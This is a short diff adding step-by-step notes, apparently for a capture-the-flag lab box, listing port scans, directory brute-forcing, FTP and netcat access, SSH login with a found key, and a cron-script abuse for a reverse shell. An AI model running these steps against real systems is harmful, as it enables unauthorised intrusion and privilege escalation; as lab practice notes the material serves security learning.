@@ -1,0 +1,14 @@
+1 - nmap -A 10.10.59.70
+2 - gobuster dir -u http://10.10.59.70:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - nmap -p -r 1111 10.10.59.70
+4 - nmap -p -r 2222 10.10.59.70
+5 - nmap -p -r 3333 10.10.59.70
+6 - nmap -p -r 4444 10.10.59.70
+7 - nmap -A -p- 10.10.59.70
+8 - ftp 10.10.59.70
+9 - nc 10.10.59.70 4420
+10 - ssh -i id_rsa catlover@10.10.59.70
+11 - ps -aux | grep "docker"
+12 - cat /etc/crontab
+13 - /opt/clean/clean.sh -> reverse shell
+14 - whoami
